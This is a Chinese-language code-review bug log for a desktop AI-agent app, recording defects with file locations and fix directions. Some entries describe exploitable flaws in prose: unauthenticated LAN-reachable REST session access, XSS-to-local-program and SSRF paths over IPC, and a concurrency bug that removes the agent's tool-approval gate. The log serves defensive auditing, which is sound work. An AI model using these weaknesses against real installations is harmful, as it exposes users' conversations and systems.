# 三端模块代码审查 · Bug 登记（2026-10-08 起）

> **审查范围**：`Src/`（后端五层）+ `Client/src`（前端 React）+ `electron/` 与 `Src/Interface/IpcBridge`（桌面桥）——即"三端"。
> **2026-10-09 补片**：顶层 `Server/`（云端账号服务，Fastify 5 + PostgreSQL）原不在上述口径内，从未被审过；因它已承载密码哈希/令牌/验证码/设备绑定与跨端同步，分两片补审——**M13** 应用代码（§18，REV-349~383）、**M14** 测试·迁移·运维面与 CI 接线（§19，REV-384~412）。
> **2026-10-10 补片**：**M15** 内容资产面——`Prompts/`·`Skills/`·`Benchmarks/` 与消费它们的三端接线（§20，REV-413~427）。此前各片只审到"读这些资产的代码"，未审资产本身与"配置/UI/运行面"是否对齐。
> **2026-10-10 补片（二）**：**M16** 本地测试面——根 `Tests/**` 与 `vitest.config.ts` / CI test-build job / 守门脚本的接线（§21，REV-428~450）。M01~M15 一直**引用**这 150 个 spec 的绿灯作为结论依据，却从未审过它们；本片是唯一一条元层面的片子：不评"代码有没有 bug"，只评"**凭什么说代码没有 bug**"。
> **审查方式**：逐模块（垂直功能域切片）推进，每片由三个子代理分别审查前端 / 服务端 / 桌面-接入端，重点看**五类问题**：
> ① 三端交互逻辑（契约、字段、时序、并发）② 安全 ③ 日志与错误可观测性 ④ 用户体验 ⑤ 业务语义正确性。
> **本文件只登记，不含修复**；全部模块审完后再统一立项修复。
> **口径**：与 `Docs/Dev/*-差别清单.md`（文档-代码对账）不重叠——本处只看**代码本身的缺陷**，文档滞后不登记。
> 另有既有登记：[Agent循环与路径-Bug登记.md](Agent循环与路径-Bug登记.md)（BUG-2026-10-08-1~3），本文件不重复同一现象。
> 证据标注：`✅复核` = 主审亲自读代码确认；`✅实证` = 主审亲自跑只读脚本复现（M13 两处，见 REV-349/352）；`△子代理` = 子代理给出 file:line 但未二次复核（修复前需抽样验证）。

---

## 0. 审查进度总览

| # | 模块切片 | 状态 | 新登记 |
|---|---|---|---|
| M01 | 会话与对话主链路（Session / AgentRuntime / chatApi / IPC 对话通道 / Client chatStore·Chat 组件） | ✅ 已审 | REV-001~022 |
| M02 | 主循环与循环控制（Core/Loop · LoopControl · LoopScheduler · DurableExecution · Client loop/LoopDebugger） | ✅ 已审 | REV-023~037 |
| M03 | 工具系统与执行安全（Tools/** · Infra/Sandbox·Terminal·Fs·Security · Client Approval*） | ✅ 已审 | REV-038~059 |
| M04 | 模型接入与凭据（Infra/Llm · Configs/modelRouter · keyStore·secretsStore · Client Settings/modelStore） | ✅ 已审 | REV-060~075 |
| M05 | 治理四域（Governance·Regulation·Supervision·Audit·Arbitration·Recruitment·ReviewerAgent · Client 治理视图） | ✅ 已审 | REV-076~100 |
| M06 | Token 经济 / 记忆 / 上下文（TokenEconomy·Context·SharedMemory·Retrieval·Cache·Planning·Prompts·Roles） | ✅ 已审 | REV-101~116 |
| M07 | A2A 与事件契约（Services/A2A·EventBus · WebSocket·EventStore·InputDeduplication·Contracts · Client eventStore·useEventBus） | ✅ 已审 | REV-117~131 |
| M08 | 接入层安全与 IPC 暴露面（WebServer · RestApi/router 鉴权·CORS·限流 · ipcBridge 全通道 · electron main·preload） | ✅ 已审 | REV-132~173（§11） |
| M09 | 持久化与数据模型（Infra/Db 仓储·迁移·DDL 一致性 · AccountScope · Client stores 持久化） | ✅ 已审 | REV-174~213（§12） |
| M10 | 可观测性：日志 / 追踪 / 健康（Infra/Logging · Logs 落盘 · Client TraceReplay·Dashboard · 健康端点） | ✅ 已审 | REV-214~250（§13） |
| M11 | 前端组件族与交互体验（ai-components core·harness · Layout·WorkingModes·TaskPanel · hooks·config·shared） | ✅ 已审（含契约视角 §14.5） | REV-251~324（§14） |
| M12 | 构建 / 运行形态 / 打包（Scripts/** · package.json · tsconfig* · CI · electron 打包） | ✅ 已审 | REV-278~311（§15） |
| M13 | 云端账号服务（`Server/**` · Fastify+PostgreSQL 账号/令牌/验证码/设备绑定/同步/备份 · Client accountStore·serverApi·syncService · electron server-fetch·urlPolicy） | ✅ 已审（2026-10-09 补片，原口径遗漏） | REV-349~383（§18） |
| M14 | 云端的测试·迁移·运维面（`Server/test/**` · `Server/migrations/**` + `src/db/migrate.ts`·`pool.ts` · `Server/scripts/**` · `docker-compose.yml`·`package.json`·`tsconfig`·`vitest.config` · 与根 CI 的接线） | ✅ 已审（2026-10-09 补片） | REV-384~412（§19） |
| M15 | 内容资产面（`Prompts/**` roles·system·tasks·versions · `Skills/**` playbooks·rubrics·rules·strategies · `Benchmarks/**` · 及其三端接线：`Services/Prompts/**`·`verifier/**`·`ReviewerAgent`·`agentFactory`·`runIteration`·`orchestrator`·`Configs/{security,loopConfig,modelRouter}.json`·`configSchema.ts`） | ✅ 已审（2026-10-10 补片） | REV-413~427（§20） |
| M16 | 本地测试面（根 `Tests/**` 150 个 spec / 21 目录 · `vitest.config.ts` · `.github/workflows/ci.yml` 的 test·build job · `Configs/{coverageBaseline,benchBaseline}.json` · `Scripts/experimentMatrix.cjs` · `Tests/gateG0.spec.ts`） | ✅ 已审（2026-10-10 补片，元层面） | REV-428~450（§21） |
| — | 全库收口与修复优先级 | ⚠️ 已收口后被 M13/M14/M15/M16 重开 | §16（P0/P1/P2 工单与验收口径）+ §18.4、§19.4、§20.2、§21.2（新增 P0-5 云端凭据面止血 / **P0-6 云端验证面接通** / **P0-7 测试面假绿止血（M16 建议新增，含 REV-429 的数据破坏风险）** / P1-9 令牌与身份权威（M15 建议扩名为"治理红线"，M16 的 REV-432/436/437/438 并入）/ **P1-10 云端数据演进加固** / **P1-11 资产-代码接线对账（M15 建议新增，M16 的 REV-434/435/442/445/446 并入）** / P2-5 云端一致性与可观测性；另 REV-413 建议归 P0-4 主链路），均待并入 §16.3 |

---

## 1. Bug 登记表（M01 会话与对话主链路）

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-001 | 服务+桌面 | 高 | 安全 | REST 零鉴权 + 属主是可写的进程全局 + 默认绑 `0.0.0.0`，任意局域网主机可读写他人会话 | ✅复核 · ✅已修复(P0-2 2026-10-08)：三因中「默认绑 `0.0.0.0`」与「REST 零鉴权」已闭 ——`resolveBindHost` 未显式授权即回退 `127.0.0.1`（实测同机用局域网 IP `10.44.81.114:3000` 不可达），`/api/*` 一律过控制面凭据门（无凭据 401 且留痕）。属主可写面收敛为「仅本机持凭据者可写」；**残留**：身份仍是客户端自报，已鉴权本地的跨账号身份绑定/按路由授权未接线（见 REV-133 残留，归后续工单） |
| REV-002 | 桌面 | 高 | 安全 | `open-path` / `server-fetch` 两个 IPC 无来源校验与目录白名单，渲染层 XSS 即可拉起本地程序 / 内网请求 | △子代理 |
| REV-003 | 前端+服务 | 高 | 交互 | 浏览器形态主链路断裂：`send()` 静默丢弃命令，无 REST 生成/SSE 通道，UI 仍显示在线 | ✅复核 |
| REV-004 | 三端 | 高 | 交互 | 流式内容与落库内容语义分叉 + 按 `(role, content)` 文本匹配回填 → 重复气泡、刷新后回复"变短"、error 态被洗白 | ✅复核 |
| REV-005 | 服务 | 高 | 业务/并发 | 会话无串行化、入口 Agent 为进程级单例被多条消息同时驱动（重入），`activeStreams` 以客户端 messageId 为键 | △子代理 |
| REV-006 | 服务 | 高 | 业务 | 归档只是列表过滤：`chat_sessions.status` 写入后再不变，归档会话仍可继续写消息；无删除路由 | △子代理 |
| REV-007 | 前端 | 高 | 日志/体验 | 用户消息落库失败被静默吞（`return null` 无提示）但照常触发生成 → 后端出现"无提问的孤儿回复" | △子代理 |
| REV-008 | 前端 | 中 | 交互 | `streamingMessageId` 全局单槽、无 sessionId 守卫：A 生成时切到 B，B 被锁、点停止杀 A | ✅复核 |
| REV-009 | 服务+前端 | 中 | 业务/体验 | 停止后 `executeLoop` 正常返回路径无 `signal.aborted` 守卫 → 二次 `STREAM_END`（把 stopped 改判 error）+ 停止后仍自动命名（额外计费） | ✅复核 |
| REV-010 | 三端 | 中 | 业务 | "工作模式"是死控件：前端发 `workingMode`，后端形参 `_workingMode` 即弃；`sessions.working_mode` 无写入方 | ✅复核 · ✅已修复(P0-4 2026-10-09)：`routingMode` 实到 `receiveTask({forcedMode})` → `forceRoute`，真实后端 A/B 取证同一描述下 `mode:DIRECT/forced:false` 与 `mode:DELEGATION/forced:true`，两条任务均 `completed`；可选集单点导出并被 `SUBMITTABLE_MODES` 跨端机器校验。**残留**：`sessions` 仍无 `working_mode` 列，本批按「删字段」收口（见 REV-319 与 §16.10） |
| REV-011 | 服务 | 中 | 日志/安全 | WebServer 异常原文回传 `Internal Error: ${error}` 且零 `logger`；`parseInt` 未判 NaN、`title/workDir` 未判类型 → 500 而非 400 | △子代理 |
| REV-012 | 三端 | 中 | 日志 | 静默降级成灾：状态机转换失败无 else、钱包创建失败无日志、DB 故障伪装"无记忆"、`writeSecureFile` 空 catch、目录选择"取消"与"失败"同返回值 | △子代理 |
| REV-013 | 服务 | 中 | 日志/业务 | 运行失败只发事件不落日志不入库；`taskApi` 的 `queueMicrotask` 无 try/catch → 任务永久停在 `running` | △子代理 |
| REV-014 | 前端 | 中 | 性能/日志 | 每个 `agent:stream_chunk` 触发 `agentStore.hydrate()` 全量拉 `/api/agents` → 长回复期间数十~百次请求打满限流，429 后富结构回填仅 `console.warn` 丢弃 | △子代理 |
| REV-015 | 前端 | 中 | 体验 | `MessageActions`（重发/复制/赞踩）全仓无 import，`onRegenerate` 等 prop 未解构；UI 文案"可点击重新生成"却无该按钮 | ✅已修复(P0-4 2026-10-09)：`MessageActions` 挂回助手气泡，**只保留真有去处的动作**——复制实装（`navigator.clipboard` 不可用的非安全上下文退回 `execCommand`，避免"点了没反应"），赞/踩（无反馈落库通道，原为内存态变色＝假反馈）与重新生成（无截断接口，重发会留下两条助手回复并污染审计链）删除，恢复前置条件是 `DELETE /api/messages/:id`；误导文案同批移除。`unwired-controls.spec.tsx` 12 例锁住 |
| REV-016 | 服务 | 中 | 交互 | IPC 入参校验弱于 REST（同一功能两形态结果分叉） | △子代理 |
| REV-017 | 桌面 | 中 | 体验 | 关窗只调 `stopServer()`，缺 SIGINT 路径的 abort + 等待 finally 落库 + 停事件持久化 → 生成中关窗丢回复 | △子代理 |
| REV-018 | 服务 | 中 | 业务 | `agentId` 进程内自增，重启后与库中历史行 `ON CONFLICT DO UPDATE` 冲突（覆盖历史/不清 destroyed_at/owner 不在 SET），失败回退到未注册的幽灵 id | △子代理 |
| REV-019 | 三端 | 低-中 | 安全/体验 | 后端异常原文渲染并持久化（`chat_messages.error`）；`reply({type:'error'})`、`generation_started` 帧前端无消费分支 → 参数校验失败时永挂"生成中" | △子代理 |
| REV-020 | 服务+桌面 | 低 | 体验/内存 | `processedEventIds` 无界增长（每 token 入集）；主进程 `listSkills` 同步 IO | △子代理 |
| REV-021 | 架构（待裁定） | 中 | 业务 | 三套并行会话模型：`Services/Session`（仅 init 被调，超时/并发限制从不生效）vs `chat_sessions` 表 vs `sessionRepository.sessions` 表 | △子代理 |
| REV-022 | 前端 | 低 | 体验 | 历史仅取 50 条且无"加载更多"；`MessageList` 全量渲染无虚拟滚动；`replayAiEvents` 切会话无"仍是当前会话"守卫 | △子代理 |

---

## 2. 逐条详情

### REV-001 · REST 零鉴权 + 可写进程全局属主 + 绑 0.0.0.0（高/安全）
- 三端定位：`Configs/default.json:11`（`"host": "0.0.0.0"`）、`Src/main.ts:849`（`serverConfig['host'] ?? '0.0.0.0'`）、`Src/Interface/RestApi/memoryApi.ts:224`（`setActiveOwner(body.userId ?? null)`）、`Src/Interface/RestApi/chatApi.ts:243`、`Src/Interface/WebServer/httpServer.ts:78-81`（仅限流）。
- 现象：会话隔离完全取决于进程变量 `getActiveOwner()`；任何能连到 3000 端口的人先 `PUT /api/account/active-user` 改属主，再读/写该账号全部会话、消息、AI 事件流。会话类路由无任何 token 校验（仅 `a2aApi`/`approvalApi` 用了 Bearer 做治理身份验真）。
- 影响：局域网/本机任意进程越权读取对话正文与思考链、向他人会话注入消息。Electron 内嵌后端复用同一启动路径，桌面用户同样暴露。
- 修复方向：默认 `127.0.0.1`；属主从请求凭证逐请求推导（一次性作用域，不改全局）；`active-user` 切换需鉴权；桌面态启动期生成随机 token。

### REV-002 · `open-path` / `server-fetch` 无来源与白名单（高/安全）
- 定位：`electron/main.ts:426`（仅 `existsSync` 即 `shell.openPath`）、`main.ts:387`（仅校验 http(s) 前缀即 `fetch(url, {headers})`）；全仓未见 `event.senderFrame` 校验。
- 影响：渲染层一旦 XSS，可用系统关联程序打开任意本地文件（`.exe`/`.lnk`），或以内网身份发起任意请求（SSRF）。
- 修复：路径限 `data/workspace/appRoot`；server-fetch 白名单仅 `127.0.0.1:<本机端口>`；校验 `senderFrame.url`。

### REV-003 · 浏览器形态对话链路断裂（高/交互）
- 定位：`Client/src/services/eventBusBridge.ts:71-81`（浏览器分支 `console.warn('[eventBusBridge] 浏览器模式下 send 不可用，命令已忽略')`）、`:53-56`（降级只做 Electron 探测轮询、从不取事件却 `setOnline(true)`）、`Src/Interface/RestApi/chatApi.ts`（无 generate/stream 路由，全仓无 `text/event-stream`）。
- 现象：`npm start`/`npm run dev` 浏览器打开时，发消息无任何回复、无报错，Composer 卡在"停止"态。
- 根因：Phase 0 把 WS 换成 IPC 时，生成/停止只实现为 IPC 专有写操作。
- 修复：补 REST 触发 + SSE 订阅；或 `send()` 返回可用性标志，不可用时禁止 `beginStream` 并显式提示"仅桌面形态支持对话"。

### REV-004 · 流式内容与落库内容分叉 + 文本匹配回填（高/交互）
- 定位：`Client/src/stores/chatStore.ts:770-773`（chunk 累积含**所有迭代**）、`Src/Interface/IpcBridge/ipcBridge.ts:1141`（`outputText = lastIter?.outputText ?? fullContent` 只存最后一轮）、`Src/Interface/RestApi/chatApi.ts:381-388`（`WHERE ... role = ? AND content = ?` 匹配失败即 INSERT 新行）、`chatStore.ts:316-317`（历史一律 `status:'complete'`）。
- 影响：刷新/切会话后助手回复变短、可能出现重复气泡；失败原因被洗白（`MessageShell.tsx:120` 只在 `error` 态显示原因）。
- 根因：前端消息 id 由客户端生成（`msg-stream-<ts>`）且不回传落库，两端只能靠正文对齐。
- 修复：以客户端 `messageId` 作落库主键并 upsert；历史保留 `status/error`；统一"多轮迭代正文"的存储口径。

### REV-005 · 会话无串行化 + 入口 Agent 单例重入（高/业务·并发）
- 定位：`ipcBridge.ts:886`（`queueMicrotask(() => startStreamGeneration(...))` 无 per-session 锁）、`:220,235-246`（`entryAgentId` 进程级单例，所有会话共用）、`Src/Core/AgentRuntime/agentExecutor.ts:45`（只拒 destroyed/expelled/suspended，`running` 可再入）、`:71`（丢弃 `assignTask` 返回值）。
- 影响：两条消息同时驱动同一 Agent，`currentLoopId/traceId` 互相覆盖；消息落库顺序取决于完成时刻而非提问顺序；"停止生成"只能停掉一条。
- 修复：会话级运行队列/互斥；运行 ID 由服务端生成并回传；`assignTask` 返回值必须消费。

### REV-006 · 归档语义只读不写、归档会话仍可写（高/业务）
- 定位：`chatApi.ts:150-152`（INSERT `'active'` 后全库无 `UPDATE chat_sessions SET status`）、`:122-124`（`archiveSession` 只写 `archived_at`）、`:434-435`/`:508`（发消息只校验存在性）；无 DELETE 会话路由。
- 影响：`status` 与 `archived_at` 两套真相漂移；归档任务继续产生消息与 `ai_events`；`paused/closed` 永不可达；"删除/恢复"在服务端不存在。
- 修复：写入路径统一判定归档态并回 409 + 原因；补删除/级联；`status` 单一权威。

### REV-007 · 用户消息落库失败被吞但仍触发生成（高/日志·体验）
- 定位：`chatStore.ts:680-689`（回滚乐观气泡后 `return null`，无 console/toast/状态位）、`Client/src/views/ChatView.tsx:56-57`（丢弃 `sendMessage` 返回值即 `beginStream` + `generate_reply`）。
- 影响：用户输入"蒸发"，Agent 仍基于内存中的 `userMessage` 执行；界面只剩一条无归属回复；且该轮不在 `buildContextHistory` 的上下文里。
- 修复：失败即中止、保留草稿并提示重试；把失败透到消息态（`queued→error`）而非删除气泡。

### REV-008 · `streamingMessageId` 全局单槽（中/交互）
- 定位：`chatStore.ts:199,745`（单值）、`ChatView.tsx:80`（`isStreaming = streamingMessageId !== null` 跨会话生效）、`:71-75`（`handleStop` 用全局 id 停止并 `persistMessageRich`）。
- 修复：改 `streaming: {sessionId, messageId}[]`，Composer 按 `activeAgentSessionId` 取值。

### REV-009 · 停止后正常返回路径无 aborted 守卫（中/业务·体验）
- 定位：`ipcBridge.ts:905-909`（stop 已发 `STREAM_END reason:'user_stopped'`）、`:1133-1187`（`await executeLoop` 返回后未判 `abortController.signal.aborted`，成功分支再发一次 `STREAM_END`，无正文时带 `error` → `chatStore.ts:819` 把 `stopped` 改判 `error`）、`:1187`（停止后仍 `await tryAutoNameSession`）。对比 `:1195` catch 分支**有** `!aborted` 守卫，说明该守卫本应同样存在于正常返回路径。
- 影响：用户停止显示为"失败"；额外一次计费模型调用；落库竞态。
- 修复：`STREAM_END` 按 messageId 幂等；`aborted` 即 return 并跳过命名。

### REV-010 · 工作模式死控件（中/业务）
- 定位：`ChatView.tsx:64`、`Composer.tsx:150-166`、`NewTaskSetup.tsx:120-130`（前端选择并发送）→ `ipcBridge.ts:874→886→933`（形参 `_workingMode?` 即弃）→ `chatStore.ts:490` 读 `s.working_mode`（全库无写入方）。
- 影响：选 consortium/流水线/审计一律按同一路径执行，属语义误导（用户以为改变了执行方式）。
- 修复：接入 `executeLoop` 的模式分派，或先隐藏选择器并在文档标注未实现。

### REV-011 · 500 原文回传且零日志 + 入参不校验（中/日志·安全）
- 定位：`Src/Interface/WebServer/webServer.ts:73-79`（`error: \`Internal Error: ${error}\``）、`:83-86`（`logRequest` 只进内存数组不写 `logger`）、`chatApi.ts:426`/`539-540`（`parseInt` 未判 NaN/上限）、`:414-416`（`title/workDir` 未判 string，非字符串时 `.trim()` 抛 TypeError）。
- 违反：`agent.md` §3.2 铁律"可被用户解决的错误必须可观测"。
- 修复：catch 内 `logger.error` + traceId，响应只回安全文案；入参统一 schema 校验（含长度上限），非法入参回 400。

### REV-012 · 静默降级清单（中/日志）
- 定位：`Src/Core/AgentRuntime/agentRuntime.ts:122-124`（`if (transResult.ok)` 无 else）；`agentFactory.ts:83-87`（钱包创建失败无日志）；`chatApi.ts:237-238`（`ensureSessionWorkDir` 失败返回 `null`）；`agentExecutor.ts:71`；`ipcBridge.ts:703-705`（`catch { return { ok:true, items: [] } }` — DB 故障伪装"无记忆"）；`electron/main.ts:462-464`（`writeSecureFile` 空 catch）；`main.ts:408-410`（`pick-directory` 失败与取消同返回值）。
- 修复：逐处 `logger.warn` 带 sessionId/agentId 上下文，并区分"取消"与"失败"。

### REV-013 · 运行失败不落日志/不入库；taskApi 无 try/catch（中/日志·业务）
- 定位：`ipcBridge.ts:1195-1204`（catch 只 `publish(AGENT_STREAM_END)`，无 `logger`、不写 error 消息行）；`Src/Interface/RestApi/taskApi.ts:46-58`（`queueMicrotask` 内同步调 `receiveTask`，无 try/catch、无 owner 隔离、`tasks` Map 进程全局）。
- 影响：窗口未连或事件丢失即完全静默；`receiveTask` 抛错成为未捕获异常并把任务永久停在 `running`（轮询拿不到终态）。

### REV-014 · chunk 触发全量 `/api/agents`（中/性能·日志）
- 定位：`Client/src/hooks/useEventBus.ts:73`（无条件分发）+ `agentStore.ts:35-40`（`type.startsWith('agent:')` 即 `hydrate()`，而 `agent:stream_chunk` 同前缀）；`:61-66`（FE-012 只节流 `loop:/token:`）；`chatStore.ts:397-405`（限流后仅 `console.warn` 丢弃富结构）；`api.ts:159-165`（429 sleep 重试阻塞事件回调）。

### REV-015 · MessageActions 未挂载（中/体验）
- 定位：`Client/src/components/Chat/MessageActions.tsx`（全仓无 import）；`MessageBubble.tsx:40-48`（声明 `onRegenerate/onCopy/onThumbUp/onThumbDown` 但只解构 `{ msg }`）；`chatStore.ts:23`（`regenerating/queued`、`setMessageStatus` 无生产者）；`MessageShell.tsx:128`（文案"可点击重新生成"）。

### REV-016 · IPC 入参校验弱于 REST（中/交互）
- 定位：`ipcBridge.ts:639-647`（未校验 role/content）vs `chatApi.ts:438-440`（`content required` + role 白名单）。同请求两形态结果不同。
- 修复：校验下沉到共用函数，REST/IPC 同源。

### REV-017 · 关窗不收尾在途流（中/体验）
- 定位：`electron/main.ts:529-531`（只 `backend.stopServer()`）→ `Src/main.ts:885-888`（仅停 HTTP+IPC）；对比 SIGINT 路径 `Src/main.ts:929-936`（abort + 400ms 等 finally 落库 + `stopAiEventPersistence`）。
- 修复：抽公共 shutdown 序列，`before-quit` 复用。

### REV-018 · agentId 自增重启冲突 → 覆盖历史 / 幽灵 id（中/业务）
- 定位：`agentFactory.ts:44`（``agent-${role}-${++agentCounter}``）；`agentRegistry.ts:114-118`（只回灌 `destroyed_at IS NULL`）；`Src/Infra/Db/Repositories/agentRepository.ts:68-78`（`ON CONFLICT(agent_id) DO UPDATE`，不清 `destroyed_at`、owner 不在 SET）；`ipcBridge.ts:242`（冲突后使用未注册的 `'agent-prime_director-fallback'`）。
- 修复：uuid + 启动时把 counter 抬到库中最大值；fallback id 不可用于执行。

### REV-019 · 异常原文直渲并入库；`error`/ACK 帧无人消费（低-中/安全·体验）
- 定位：`ipcBridge.ts:1197-1203`（`error: e.message`）→ `chatStore.ts:834` → `MessageShell.tsx:123-129`（原文渲染 + 写入 `title`）→ `chatStore.ts:385-396`（落库长期留存）；`useEventBus.ts:68-208` 对 `reply({type:'error'})`（`ipcBridge.ts:877-883`）与 `generation_started`（`:888`）无分支。
- 影响：内部信息（可能含 base_url/请求体片段）外泄；参数校验失败时永挂"生成中"。

### REV-020 · 无界事件集 + 主进程同步 IO（低/体验·内存）
- 定位：`Src/Services/EventBus/eventBus.ts:24,47-50`（`processedEventIds` 每事件永久入集，含每 token 的 chunk，仅 `resetEventBus` 清）；`ipcBridge.ts:1345-1349`（`readdirSync/statSync/readFileSync` 全量读 `Skills/*.md`）。

### REV-021 · 三套并行会话模型（中/架构，待裁定）
- 定位：`Src/Services/Session/sessionManager.ts` + `archiveManager.ts` 全库仅 `main.ts:551-552` 调 init，无调用点 ⇒ `maxConcurrentSessions`/`sessionTimeoutMs`/`cleanupExpiredSessions` 从不生效；权威会话实为 `chat_sessions`（`chatApi.ts`）；第三套是 `Src/Infra/Db/Repositories/sessionRepository.ts` 的 `sessions` 表。
- 待办：由 owner 裁定权威模型，其余两套标注废弃或删除（不自行判定）。

### REV-022 · 历史分页 / 长会话渲染 / 事件回放守卫（低/体验）
- 定位：`ipcApi.ts:173` 与 `chatApi.ts:427`（默认 50 条，无"加载更多"）；`MessageList.tsx:316-322`（全量渲染，无虚拟滚动）；`eventStore.ts:36-48`（`AIEventBus` 注释称按 sessionId 隔离，实为全局单例，`Subscribe.tsx:47` 仅按 type 过滤）；`chatStore.ts:336-351,587`（`replayAiEvents` 切会话 `clearEvents()` 且无"仍是当前会话"守卫，快速切换会串事件；当前无 `<Subscribe>` 消费方故未暴露）。
- 另需回归测试的未成文不变式：后端发 `reason:'user_stopped'`（`ipcBridge.ts:908`）而前端只看 `data.error`（`useEventBus.ts:88`），当前依赖 `chatStore.ts:785` 已被清空的 `streamingMessageId` 才没把 `stopped` 覆盖成 `complete`。

---

## 3. M01 已核对为干净（避免重复排查）

1. `chatApi` 所有会话/消息读写均带 `owner_user_id`，`addMessage` 取**会话自身属主**（`:282-284`）——切换账号不会写进他人命名空间；`/ai-events`、`/todos` 亦在 store 层按 owner 过滤（`aiEventStore.ts:123-124`、`todoStore.ts:107-108`）。
2. `MarkdownRenderer` 无 XSS 面：react-markdown v10 未挂 `rehype-raw`，`javascript:` 由默认 `urlTransform` 清洗，唯一 `dangerouslySetInnerHTML`（`:66-71`）注入 shiki 转义产物；用户正文走纯文本插值。
3. 流式写入按 `buf.sessionId` 定位（`chatStore.ts:425-437`），旧会话 chunk 不会写进新会话列表；100ms 合批确实避免逐 token setState。
4. 订阅无泄漏：仅 `AppLayout.tsx:110` 调 `useEventBus`，cleanup 移除 handler；`connectBridge` 有 `connected` 幂等守卫，StrictMode 双挂载不重复注册。
5. 凭据不入 localStorage：`secureStore.ts:58-96` Electron 走 safeStorage IPC、浏览器降级 sessionStorage；`accountStore` 的 localStorage 只有 serverUrl。
6. Electron 基线安全位：`contextIsolation=true`、`nodeIntegration=false`（`main.ts:227-228`），`will-navigate` + `setWindowOpenHandler` 拦外链。
7. IPC 通道两端命名与 payload 对齐：本模块 12 条会话/待办通道 + 7 个事件名与 `Client/src/shared/eventTypes.ts:19-27` 一致；前端 invoke 而桥未注册 = 0；`listMessages` 用 rowid 做同毫秒 tiebreaker，顺序语义正确。
   - 暴露面非最小项（待 M08 处理）：`todos.list/clear`（`preload.ts:96-99`）前端无包装；`stopIpcBridge`（`ipcBridge.ts:299-331`）漏移除 a2a 通道；`preload.ts:197` `sessions.list` 类型签名漏参。

---

## 4. M02 主循环与循环控制（REV-023~037）

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-023 | 服务 | 严重 | 安全/并发 | `ToolSafetyGate` 是进程级单例：第二个并发 Loop 注册同名中间件静默失败（返回值未判），首个 Loop 的 `finally` 把闸门摘掉 → 其余在跑的 Loop 此后危险工具**无审批门/无行为法典/无副作用日志/无幂等**，且其审批归属第一个 Loop 的 loopId | ✅复核（`runIteration.ts:929/1074`、`middlewareRegistry.ts:25` DUPLICATE_ENTRY、`ipcBridge.ts:940`） |
| REV-024 | 服务 | 严重 | 业务 | 五类 StopRules 在生产链路整体不可达：`evaluateStopRules` 只在 `ctx.loopControlSnapshot` 存在时执行，而两个生产调用点都不传该字段 → limits(墙钟/工具数)、budget_hard、no_progress、riskTriggers、verifier-success 永不评估 | ✅复核（`runIteration.ts:815`；全库 `loopControlSnapshot` 除 runIteration 外零引用） |
| REV-025 | 服务 | 高 | 安全 | 全链路无墙钟超时：`for (iter=1..max)` 无 deadline；`createTimeoutAbortController`/`mergeAbortSignals` 生产零调用（仅测试）；`modelCaller.ts:80` `combinedSignal = options?.signal ?? timeoutController.signal` —— **传了外部 signal 就关掉 60s 模型超时**；`loopConfig.json` `timeoutMsCeiling:600000` 与 `stopRules.maxWallClockMs:900000` 口径互斥 | ✅复核 |
| REV-026 | 服务 | 高 | 交互/安全 | 取消后本轮剩余工具继续执行（`runIteration.ts:688` 工具循环不查 `ctx.signal?.aborted`，abort 只在迭代之间检查）；Tools 层零处消费 `context.signal`；审批等待 `waitForApprovalDecision` 未传 signal → 停止后最多再挂 60s 并可能真的执行副作用 | △子代理 · ✅真实取证(2026-10-08)：`Tests/AgentRuntime/realAgent.spec.ts` 用例被超时强杀后，其迟到的模型续体仍在新一次 `fullReset()` 之后执行 `submitForReview`，把 `getPendingReviewCount()` 从 2 改成 3 —— 即"上游已放弃/已重置的一轮，迟到结果照样写入运行时全局状态"在真实运行中可复现。修复面同本条：出网的模型调用必须可取消，续体必须校验世代 |
| REV-027 | 服务 | 高 | 业务 | 幂等键抹平嵌套参数：`JSON.stringify(args, Object.keys(args).sort())` 的 replacer 数组只保留顶层键，嵌套内容被序列化成 `{}` → 不同调用命中同一键、返回旧结果并跳过真实执行（含 `tool.execute`、`todo.write`、`code.sandbox`）；`spec.idempotencyKeyFields` 声明但从不参与计算 | ✅复核（node 复现：`{path,content:{line:'AAA'}}` 与 `'BBB'` 同串） |
| REV-028 | 服务 | 高 | 业务 | success 判定绕过 Verifier：`iterationController.ts:63` 仅凭 `hasOutput && !hadToolCall` 判 success；`loopState.ts:138 successCriteria: VerifierSpec[]` 无评估方；`runVerifierPipeline` 唯一调用方是 reviewerAgent → 谎报完成被落库并经 `loopKnowledge.ts:43` 沉淀为长期记忆 | △子代理 |
| REV-029 | 服务 | 中高 | 日志 | "为什么停了"无法从日志/DB 回答：连续失败详情把 `toolName` 填成 `r.tool_call_id`（`runIteration.ts:778`）；模型失败降级为 `exitReason:'risk'` 且流式路径返回 `ModelCallOutput` 非 `Result` → 实得 `Model call failed: undefined`；abort 后 `exitReason` 为 undefined；`touchLoop` 支持 `stoppedReason` 但唯一调用点只写 `phase:'running'`；`LOOP_STARTED/COMPLETED/ABORTED/NO_PROGRESS_STAGNATED` 全仓零发布方 | △子代理 |
| REV-030 | 服务 | 中 | 业务/安全 | 持久执行"半接线"：`main.ts:381 scanAndProposeRecovery()` 返回值丢弃（REQUIRE_HUMAN 不上报）；`recoveryScanner.ts:170 estimateBudgetUsedRatio → return 0`（预算闸失效）；`executeRecovery` 无生产调用方 → 恢复语义 ≠ 不中断（重复计费不可判定）；`contextCompression.ts:211` 摘要直调 `callModel` 不进 `wrapModelCall` → 真实计费不入预算/钱包 | △子代理 |
| REV-031 | 前端 | 中 | 体验 | 停止后被后端事件翻回"已完成"：`useEventBus.ts:102` 对无 `error` 的 stream_end 直接 `finalizeStream` → `chatStore.ts:791` 无条件覆写 `'complete'`；finalize 无"当前必须 streaming"终态守卫（与 REV-009 同族但根因不同：前端缺守卫） | △子代理 |
| REV-032 | 前端 | 中 | 业务/体验 | 轮次统计/退出原因/预算告警界面全盲：`useEventBus.ts:152 if (data.messageId && data.toolCalls?.length)` 使纯文本轮整帧丢弃（末轮 `totalIterations` 不更新）；payload 的 `outputText/tokensConsumed/decision` 未使用；`loopEconomy.ts:131` 的 BUDGET_WARMING/SOFT/HARD 无前端分支；前端只要 `outputText` 非空即判 complete，不看 `exitReason` | △子代理 |
| REV-033 | 前端 | 中 | 日志 | 未知事件类型无兜底分支（if/else 链后静默入缓冲，"后端加了事件前端不知道"零告警）；`loopStore.ts:34`、`systemStore.ts:49` `!res.ok` 静默；`chatStore.ts:348` replay `catch { return 0 }` 全吞 | △子代理 |
